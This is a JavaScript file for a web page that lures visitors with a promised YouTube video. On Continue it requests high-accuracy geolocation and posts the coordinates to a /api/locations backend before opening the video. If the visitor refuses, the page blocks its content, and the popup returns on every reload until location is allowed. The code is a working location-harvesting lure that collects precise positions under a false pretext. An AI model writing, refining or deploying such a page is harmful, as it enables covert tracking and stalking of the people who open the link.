/**
 * Consent dialog → browser geolocation → save + open YouTube.
 *
 * - Profile stays visible until "Never allow".
 * - Custom popup is shown on every page load / reload.
 * - Continue always calls the Geolocation API (so the browser
 *   location options can appear whenever the browser allows it).
 */

const YOUTUBE_URL = "https://www.youtube.com/watch?v=l_GlMjcPoOQ";

const dialogEl = document.getElementById("consent-dialog");
const continueBtn = document.getElementById("consent-continue");
const notNowBtn = document.getElementById("consent-not-now");
const statusEl = document.getElementById("status");
const pageContent = document.getElementById("page-content");
const blockedEl = document.getElementById("blocked-screen");
const dialogHintEl = document.getElementById("consent-hint");

function showDialog() {
  dialogEl.hidden = false;
  dialogEl.setAttribute("aria-hidden", "false");
  if (blockedEl) blockedEl.hidden = true;
  document.body.classList.remove("content-blocked");
  if (pageContent) pageContent.hidden = false;
}

function hideDialog() {
  dialogEl.hidden = true;
  dialogEl.setAttribute("aria-hidden", "true");
}

function setStatus(message, tone = "info") {
  if (!statusEl) return;
  statusEl.hidden = false;
  statusEl.textContent = message;
  statusEl.className = `status is-${tone}`;
}

function setDialogHint(message) {
  if (!dialogHintEl) return;
  if (!message) {
    dialogHintEl.hidden = true;
    dialogHintEl.textContent = "";
    return;
  }
  dialogHintEl.hidden = false;
  dialogHintEl.textContent = message;
}

function openYouTube() {
  window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
}

function showBlockedScreen() {
  hideDialog();
  if (pageContent) pageContent.hidden = true;
  if (blockedEl) blockedEl.hidden = false;
  document.body.classList.add("content-blocked");
}

async function sendLocationToServer(payload) {
  const response = await fetch("/api/locations", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const data = await response.json().catch(() => ({}));
    console.error("Backend save failed:", data.error || response.status);
    return false;
  }

  return true;
}

function requestBrowserLocation() {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(Object.assign(new Error("unsupported"), { code: -1 }));
      return;
    }

    // This is what triggers the browser "Allow / Never allow" popup
    // (only if permission is not already set to denied).
    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 20000,
      maximumAge: 0,
    });
  });
}

async function getGeoPermissionState() {
  try {
    if (!navigator.permissions?.query) return "unknown";
    const result = await navigator.permissions.query({ name: "geolocation" });
    return result.state;
  } catch {
    return "unknown";
  }
}

function isDeniedError(error) {
  return (
    error &&
    (error.code === 1 ||
      error.code === error.PERMISSION_DENIED ||
      String(error.message || error)
        .toLowerCase()
        .includes("denied"))
  );
}

/** Continue → always request location so browser options can appear. */
async function handleContinue() {
  continueBtn.disabled = true;
  notNowBtn.disabled = true;

  // Do NOT skip the API call when denied — still attempt it.
  // If the browser already saved "Never allow", it won't show UI again
  // until the user resets site location permission.
  hideDialog();
  setStatus("Check the browser location popup…", "info");

  try {
    const position = await requestBrowserLocation();

    const payload = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      timestamp: position.timestamp,
    };

    await sendLocationToServer(payload);
    setStatus("You’re all set. Opening YouTube…", "ok");
    openYouTube();
  } catch (error) {
    console.error("Location flow error:", error);

    if (isDeniedError(error)) {
      showBlockedScreen();
      return;
    }

    setStatus("Could not get your location. Please try Continue again.", "error");
    showDialog();
  } finally {
    continueBtn.disabled = false;
    notNowBtn.disabled = false;
  }
}

function handleNotNow() {
  hideDialog();
  setStatus("Refresh the page anytime to see the options again.", "info");
}

async function init() {
  // Every load/reload shows the Open Youtube popup again.
  showDialog();

  const perm = await getGeoPermissionState();
  if (perm === "denied") {
    setDialogHint(
      "Location is blocked for this site. On iPhone: aA or i icon → Website Settings → Location → Allow. On Android: lock icon → Permissions → Location → Allow. Then tap Continue."
    );
  } else {
    setDialogHint("");
  }
}

continueBtn.addEventListener("click", handleContinue);
notNowBtn.addEventListener("click", handleNotNow);

document.getElementById("blocked-reload")?.addEventListener("click", () => {
  // Hard reload so the consent popup shows again.
  window.location.href = `${window.location.pathname}?t=${Date.now()}`;
});

init();
